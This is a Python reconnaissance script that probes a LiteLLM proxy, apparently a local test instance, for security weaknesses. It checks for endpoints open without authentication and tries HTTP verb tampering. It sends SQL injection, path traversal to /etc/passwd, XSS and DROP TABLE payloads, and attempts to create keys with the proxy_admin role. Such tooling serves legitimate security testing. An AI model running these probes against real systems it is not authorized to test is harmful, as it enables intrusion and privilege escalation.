#!/usr/bin/env python3
"""
Level 1 Recon — Fast automated scan for litellm proxy.
Runs in ~2 minutes, no DB required, no state.
Outputs: list of suspicious endpoints + quick wins for agents.
"""
import requests, json, time, sys, concurrent.futures

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4000"
MASTER = "sk-master-test-1234"
MHDR = {"Authorization": f"Bearer {MASTER}"}
OUT = {}

def req(method, path, **kwargs):
    try:
        r = requests.request(method, f"{BASE}{path}", timeout=5, **kwargs)
        return r.status_code, r.text[:300]
    except Exception as e:
        return 0, str(e)

print(f"\n{'='*60}")
print(f"  LiteLLM Level-1 Recon — {BASE}")
print(f"  {time.strftime('%Y-%m-%d %H:%M:%S')}")
print(f"{'='*60}\n")

# ── 1. Unauthenticated endpoints scan
print("[1] Unauthenticated access scan")
noauth_targets = [
    "/health", "/health/liveliness", "/health/readiness", "/health/check",
    "/routes", "/openapi.json", "/docs", "/redoc",
    "/debug/asyncio-tasks", "/debug/info", "/debug/vars",
    "/metrics", "/actuator", "/actuator/health",
    "/sso/debug/login", "/sso", "/sso/login",
    "/models", "/model/info",
    "/settings", "/get/config", "/config/yaml",
    "/admin", "/internal", "/system",
    "/spend/logs", "/user/list", "/key/list", "/global/spend",
]

open_endpoints = []
for path in noauth_targets:
    code, body = req("GET", path)
    if code == 200:
        tag = "🔴 OPEN"
        open_endpoints.append((path, body[:80]))
    elif code == 0:
        tag = "⚪ ERR"
    else:
        tag = f"🟢 {code}"
    print(f"  {tag:12} {path}")

# ── 2. HTTP verb tampering on protected endpoints
print("\n[2] HTTP verb tampering")
verb_targets = ["/user/list", "/key/list", "/global/spend", "/spend/logs"]
for path in verb_targets:
    for method in ["POST", "PUT", "PATCH", "HEAD", "OPTIONS"]:
        code, _ = req(method, path)
        if code == 200:
            print(f"  🔴 VERB BYPASS  {method} {path} → 200")

# ── 3. Null byte + special chars in key parameter
print("\n[3] Null byte / special char injection")
payloads = [
    ("null byte", f"{BASE}/key/info?key=sk-test%00admin"),
    ("SQL inject", f"{BASE}/key/info?key='+OR+1=1+--"),
    ("path traverse", f"{BASE}/key/info?key=../../../etc/passwd"),
    ("double key", f"{BASE}/key/info?key=sk-a&key=sk-b"),
]
for name, url in payloads:
    try:
        r = requests.get(url, headers=MHDR, timeout=5)
        tag = "🔴 200" if r.status_code == 200 else f"🟢 {r.status_code}"
        print(f"  {tag:12} {name}")
    except Exception as e:
        print(f"  ⚪ ERR      {name} — {e}")

# ── 4. Business logic — edge case values
print("\n[4] Business logic — edge cases via /key/generate")
edge_cases = [
    ("negative budget",  {"models": ["ollama/llama3.2"], "max_budget": -999}),
    ("zero budget",      {"models": ["ollama/llama3.2"], "max_budget": 0}),
    ("budget overflow",  {"models": ["ollama/llama3.2"], "max_budget": 9e99}),
    ("empty models",     {"models": []}),
    ("wildcard model",   {"models": ["*"]}),
    ("no expiry",        {"models": ["ollama/llama3.2"], "duration": None}),
    ("negative expiry",  {"models": ["ollama/llama3.2"], "duration": "-1h"}),
    ("xss in alias",     {"models": ["ollama/llama3.2"], "key_alias": "<script>alert(1)</script>"}),
    ("sql in alias",     {"models": ["ollama/llama3.2"], "key_alias": "'; DROP TABLE keys; --"}),
    ("admin role",       {"models": ["ollama/llama3.2"], "user_role": "proxy_admin"}),
]
for name, payload in edge_cases:
    code, body = req("POST", "/key/generate", headers=MHDR, json=payload)
    tag = "🔴 200" if code == 200 else f"   {code}"
    note = ""
    if code == 200:
        try:
            d = json.loads(body + "}")
            note = f"key={d.get('key','')[:20]}..."
        except:
            note = body[:60]
    print(f"  {tag:12} {name:25} {note}")

# ── 5. Content-type confusion
print("\n[5] Content-type confusion")
ct_tests = [
    ("XML body",       "application/xml",  "<root><key>test</key></root>"),
    ("text/plain",     "text/plain",       '{"model": "ollama/llama3.2"}'),
    ("no content-type","",                 '{"model": "ollama/llama3.2"}'),
]
for name, ct, body in ct_tests:
    hdrs = dict(MHDR)
    if ct: hdrs["Content-Type"] = ct
    code, resp = req("POST", "/chat/completions", headers=hdrs, data=body)
    tag = "🔴 200" if code == 200 else f"   {code}"
    print(f"  {tag:12} {name}")

# ── 6. Concurrent request race on budget
print("\n[6] Race condition probe — concurrent unauthenticated requests")
def hit(path):
    return req("GET", path)[0]

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    results = list(ex.map(hit, ["/health/readiness"] * 10))
ok = results.count(200)
print(f"  {ok}/10 concurrent requests returned 200 (baseline)")

# ── 7. Summary
print(f"\n{'='*60}")
print("  SUSPICIOUS ENDPOINTS (open without auth):")
if open_endpoints:
    for path, snippet in open_endpoints:
        print(f"  🔴 {path}")
        print(f"     {snippet[:80]}")
else:
    print("  None found beyond known public routes")

print(f"\n  Recommend agents investigate:")
print(f"  → Business logic edge cases above (any that returned 200)")
print(f"  → HTTP verb tampering results")
print(f"  → Save full report: python3 recon_level1.py > /tmp/recon_l1.txt")
print(f"{'='*60}\n")

with open("/tmp/litellm_recon_l1.json", "w") as f:
    json.dump({"open": open_endpoints, "base": BASE, "ts": time.time()}, f)
print("Saved: /tmp/litellm_recon_l1.json")
